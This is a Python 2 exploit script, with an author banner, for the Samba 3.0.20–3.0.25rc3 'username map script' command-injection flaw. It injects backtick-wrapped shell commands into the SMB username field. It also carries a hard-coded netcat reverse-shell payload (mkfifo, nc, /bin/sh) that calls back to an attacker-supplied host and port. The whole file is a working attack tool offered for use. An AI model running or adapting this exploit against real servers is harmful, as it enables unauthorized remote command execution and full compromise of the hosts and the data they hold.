#!/usr/bin/python2
#-*- coding:utf-8 -*-
#Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution

import os
import time
import socket
import platform
import sys
import threading

try:
    from datetime import datetime
except ImportError:
    print("[*] Module Datetime Not Found !")

try:
    from smb.SMBConnection import SMBConnection
except ImportError:
    print("[*] Module SMB Not Found !")

try:
    import nclib
except ImportError:
    print("[*] Module NCLIB Not Found !")


banner = '''
\033[32m
 _______ _______ ______       _     _ _______ _______  _____ 
 |______ |  |  | |_____]      |     | |  |  | |_____| |_____]
 ______| |  |  | |_____]      |_____| |  |  | |     | |      
                                                             
                    User Map Script Remote Command Injection
                    Created By Unam3dd
                    Github : \033[31mUnam3dd\033[32m
                    Instagram : \033[31munam3dd
\033[00m
'''

PAYLOAD_REVERSE_SHELL = "mkfifo /tmp/ffuw; nc 192.168.1.71 4444 0</tmp/ffuw | /bin/sh >/tmp/ffuw 2>&1; rm /tmp/ffuw"


def platform_required():
    if 'Linux' not in platform.platform():
        sys.exit("[*] Linux Required !")


def py_version_required():
    if sys.version[0] =="3":
        sys.exit("[*] Please Use Python2.7 For This Script !")

def check_port(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip,int(port)))
        return True
    except:
        return False

def sending_exploit(ip,port,command):
    userid = "/=`nohup " +command.encode("utf-8") + "`"
    password = "passwd"
    try:
        conn = SMBConnection(userid,password,"HELLO","WORLD", use_ntlm_v2 = False)
        conn.connect(ip,int(port))
        return True
    except:
        return False

if __name__ == '__main__':
    platform_required()
    py_version_required()

    if len(sys.argv) <3:
        print(banner)
        print("usage : %s cmd <rhost> <rport> <payload_command>" % (sys.argv[0]))
        print("        %s reverse_shell <rhost> <rport> <lhost> <lport>" % (sys.argv[0]))
    else:
        print(banner)

        if sys.argv[1] =="cmd":
            
            if check_port(sys.argv[2],sys.argv[3]) ==True:
                print("\033[32m[\033[34m+\033[32m] SMB Service Found !")
                print("\033[32m[\033[34m+\033[32m] Payload Injected !")
                sending_exploit(sys.argv[2],sys.argv[3],sys.argv[4])
            else:
                print("\033[32m[\033[31m-\033[32m] SMB Service Not Found !")
        
        elif sys.argv[1] =="reverse_shell":
            if check_port(sys.argv[2],sys.argv[3]) ==True:
                print("\033[32m[\033[34m+\033[32m] SMB Service Found !")
                print("\033[32m[\033[34m+\033[32m] Reverse Shell Injected Reversed On => %s:%s " % (sys.argv[4],sys.argv[5]))
                reverse_shell = PAYLOAD_REVERSE_SHELL
                reverse_shell = reverse_shell.replace("192.168.1.71",sys.argv[4])
                reverse_shell = reverse_shell.replace("4444",sys.argv[5])
                sending_exploit(sys.argv[2],sys.argv[3],reverse_shell)
            else:
                print("\033[32m[\033[31m-\033[32m] SMB Service Not Found !")